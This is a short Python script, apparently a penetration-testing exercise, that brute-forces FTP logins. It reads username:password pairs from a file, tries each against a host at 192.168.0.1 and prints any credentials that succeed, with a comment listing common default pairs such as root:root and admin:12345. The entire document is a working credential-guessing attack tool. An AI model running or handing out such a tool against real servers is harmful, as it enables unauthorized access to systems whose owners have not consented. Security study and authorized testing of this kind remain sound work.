#!/usr/bin/python
# -*- coding:utf-8 -*-
import ftplib


def brute_login(hostname, password_file):
    pf = open(password_file, 'r')
    for line in pf.readlines():
        user_name = line.split(':')[0]
        password = line.split(':')[1]
        print("[+] Trying: " + user_name + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + user_name + '/' + password)
            ftp.quit()
            return user_name, password
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return None, None


# userpass.txt
# administrator:password
# admin:12345
# root:secret
# guest:guest
# root:root
host = '192.168.0.1'
password_file = 'userpass.txt'
brute_login(host, password_file)
